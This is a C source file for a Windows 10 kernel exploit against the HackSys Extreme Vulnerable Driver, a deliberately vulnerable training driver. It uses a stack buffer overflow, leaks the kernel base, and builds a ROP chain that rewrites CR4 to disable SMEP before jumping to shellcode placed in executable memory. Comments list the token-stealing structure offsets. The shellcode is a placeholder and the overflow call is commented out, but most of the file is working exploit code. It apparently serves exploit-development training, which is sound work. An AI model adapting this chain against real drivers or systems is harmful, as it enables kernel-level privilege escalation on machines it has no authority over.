#include "exploit.h"

// This shellcode is heavily based off of Connor McGarr's write-up! Check it out!
// https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/

// Windows 10 20H2 offsets
// Current process' PRCB offset: +0x180
// Current process' _EPROCESS structure offset: +0x8
// ActiveProcessLinks offset : +0x448
// UniqueProcessId offset : +0x440
// Process Token offset : +0x4B8
char shellcode[] =
{
	0xCC // SHELLCODE TO BE RE-ADDED!
};

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	long long pop_rcx_gadget = 0, rcx_cr4_value = 0x70678, mov_cr4_rcx_gadget = 0, kernel_base = 0, *shellcode_address = 0;
	unsigned long bytes_returned = 0;
	char unused = 0, output[1024], input[2104];

	RtlSecureZeroMemory(&input, sizeof(input));
	RtlSecureZeroMemory(&output, sizeof(output));

	system("title Stack Buffer Overflow SMEP Bypass");

	printf("%s[!] Exploit written by ExAllocatePool2.\n[!] Lets exploit!", BANNER);

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the HackSys Extreme Vulnerable Driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the HackSys Extreme Vulnerable Driver. Handle Value: 0x%p", h_driver);

	kernel_base = leak_ntoskrnl_base_address();
	if (!kernel_base)
	{
		return 1;
	}

	pop_rcx_gadget = kernel_base + POP_RCX_OFFSET;
	mov_cr4_rcx_gadget = kernel_base + MOV_CR4_RCX_OFFSET;
	printf("\n[+] Calculated instruction addresses required for our chain.");

	shellcode_address = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!shellcode_address)
	{
		printf("\n[-] Failed to allocate %d bytes of stack memory. Error: %d (0x%x)", (int)sizeof(shellcode), GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated %d bytes of stack memory. Shellcode Allocation Address: 0x%p", (int)sizeof(shellcode), shellcode_address);

	memcpy(shellcode_address, &shellcode, sizeof(shellcode));
	printf("\n[+] Mapped shellcode onto the allocation.");

	memset(input, 0x41, 2072);
	*(long long*)(input + 2072) = (long long*)pop_rcx_gadget;
	*(long long*)(input + 2080) = (long long*)rcx_cr4_value;
	*(long long*)(input + 2088) = (long long*)mov_cr4_rcx_gadget;
	*(long long*)(input + 2096) = shellcode_address;
	printf("\n[+] Crafted input buffer.\n[!] Redirecting code execution to payload address... Payload Address: 0x%p", (long long*)shellcode_address);
	Sleep(1000);

	char testing[40];
	memset(testing, 0x41, sizeof(testing));
	DeviceIoControl(h_driver, TARGET_IOCTL, &testing, sizeof(testing), &output, sizeof(output), &bytes_returned, 0);
	//DeviceIoControl(h_driver, TARGET_IOCTL, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);

	system("start cmd.exe");
	printf("\n[+] Exploit completed.");
	unused = getchar();

	return 0;
}